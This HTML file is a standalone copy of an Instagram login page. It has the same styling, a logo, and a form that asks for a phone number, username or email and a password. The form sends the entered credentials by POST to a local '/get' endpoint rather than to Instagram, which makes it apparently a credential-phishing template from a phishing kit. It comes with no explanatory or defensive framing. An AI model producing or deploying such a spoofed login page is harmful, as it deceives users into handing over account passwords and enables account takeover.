<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Instagram</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .main-container {
        width: 350px;
        text-align: center;
      }
      .login-box {
        background: #fff;
        border: 1px solid #dbdbdb;
        border-radius: 1px;
        margin-bottom: 10px;
        padding: 40px;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        background: #fafafa;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        font-size: 12px;
        padding: 9px 8px 7px;
        margin-bottom: 6px;
        outline: none;
        box-sizing: border-box;
      }
      .g-input:focus {
        border-color: #a8a8a8;
      }
      .gbtn-primary {
        width: 100%;
        padding: 7px 16px;
        background: #0095f6;
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 14px;
        font-weight: 600;
        margin-top: 8px;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: #1877f2;
      }
      .divider {
        display: flex;
        align-items: center;
        margin: 18px 0px;
        text-transform: uppercase;
        font-size: 13px;
        font-weight: 600;
        color: #8e8e8e;
      }
      .divider::before, .divider::after {
        content: '';
        flex: 1;
        border-bottom: 1px solid #dbdbdb;
      }
      .divider span {
        padding: 0 16px;
      }
      .g-h2 {
        font-size: 14px;
        font-weight: 400;
        color: #262626;
        margin-bottom: 20px;
      }
      .g-h2 a {
        color: #0095f6;
        text-decoration: none;
      }
      .footer-box {
        background: #fff;
        border: 1px solid #dbdbdb;
        border-radius: 1px;
        padding: 22px 0;
        font-size: 14px;
      }
      .footer-box a {
        color: #0095f6;
        text-decoration: none;
        font-weight: 600;
      }
      .footer-text {
        font-size: 12px;
        color: #8e8e8e;
        margin-top: 16px;
      }
      .footer-text a {
        color: #8e8e8e;
      }
    </style>
  </head>
  <body>
    <div class="main-container">
      <div class="login-box">
        <svg id="logo" viewBox="0 0 175 51" width="175" height="51">
          <path fill="#262626" d="M12.6 3.2c-2.6 0-2.9 0-3.9.1-.9 0-1.5.2-2.1.4-.5.2-1 .5-1.5 1-.5.5-.8 1-1 1.5-.2.6-.4 1.2-.4 2.1 0 1-.1 1.3-.1 3.9s0 2.9.1 3.9c0 .9.2 1.5.4 2.1.2.5.5 1 1 1.5.5.5 1 .8 1.5 1 .6.2 1.2.4 2.1.4 1 0 1.3.1 3.9.1s2.9 0 3.9-.1c.9 0 1.5-.2 2.1-.4.5-.2 1-.5 1.5-1 .5-.5.8-1 1-1.5.2-.6.4-1.2.4-2.1 0-1 .1-1.3.1-3.9s0-2.9-.1-3.9c0-.9-.2-1.5-.4-2.1-.2-.5-.5-1-1-1.5-.5-.5-1-.8-1.5-1-.6-.2-1.2-.4-2.1-.4-1 0-1.3-.1-3.9-.1zm0 2.2c2.5 0 2.8 0 3.8.1.8 0 1.3.2 1.6.3.4.2.7.4 1 .7.3.3.5.6.7 1 .2.3.3.8.3 1.6 0 1 .1 1.3.1 3.8s0 2.8-.1 3.8c0 .8-.2 1.3-.3 1.6-.2.4-.4.7-.7 1-.3.3-.6.5-1 .7-.3.2-.8.3-1.6.3-1 0-1.3.1-3.8.1s-2.8 0-3.8-.1c-.8 0-1.3-.2-1.6-.3-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1-.2-.3-.3-.8-.3-1.6 0-1-.1-1.3-.1-3.8s0-2.8.1-3.8c0-.8.2-1.3.3-1.6.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7.3-.2.8-.3 1.6-.3 1 0 1.3-.1 3.8-.1zm0 3.7c-2.7 0-4.9 2.2-4.9 4.9s2.2 4.9 4.9 4.9 4.9-2.2 4.9-4.9-2.2-4.9-4.9-4.9zm0 8c-1.7 0-3.1-1.4-3.1-3.1s1.4-3.1 3.1-3.1 3.1 1.4 3.1 3.1-1.4 3.1-3.1 3.1zm6.2-8.3c0 .6-.5 1.1-1.1 1.1s-1.1-.5-1.1-1.1.5-1.1 1.1-1.1 1.1.5 1.1 1.1zm10.3 2.7c0-.7-.1-1.4-.2-2h-4.6v3.6h2.6c-.1.6-.5 1.4-1.3 2l2.1 1.6c1.2-1.1 1.9-2.8 1.9-5.2zm-4.5 8.1c-.7 0-1.4-.2-2-.5l-2 1.5c.9.7 2.1 1.1 3.3 1.1 2.5 0 4.6-1.7 5.3-4h-2.1c-.3.5-.9.9-1.5 1.1-.4.1-.8.2-1.3.2h-.7zm8.1-6.4h-2.5v-2.2h2.5v2.2zm0 4.4h-2.5v-3.6h2.5v3.6zm0 4.4h-2.5v-3.6h2.5v3.6zm8.4-8.8c-.8 0-1.4.2-1.8.5l-1.8-1.4c1-1 2.4-1.6 3.8-1.6 2.7 0 4.9 1.8 5.7 4.3h-2.5c-.4-1-1.3-1.7-2.4-1.7v-.1zm4.8 6.4c0 2.6-2.1 4.7-4.7 4.7-1.5 0-2.8-.7-3.7-1.7l1.8-1.4c.5.5 1.2.8 1.9.8 1.4 0 2.5-1.1 2.5-2.5 0-.7-.3-1.3-.8-1.7l1.8-1.4c1 .9 1.2 2.4 1.2 3.2z"/>
        </svg>
        <form action="/get" method="POST">
          <input class="g-input" type="text" name="email" placeholder="Phone number, username, or email">
          <input class="g-input" type="password" name="password" placeholder="Password">
          <button type="submit" class="gbtn-primary">Log In</button>
        </form>
        <div class="divider"><span>or</span></div>
        <p class="g-h2">Forgot <a href="#">password?</a></p>
      </div>
      <div class="footer-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>
      <p class="footer-text">Get the app.</p>
    </div>
  </body>
</html>
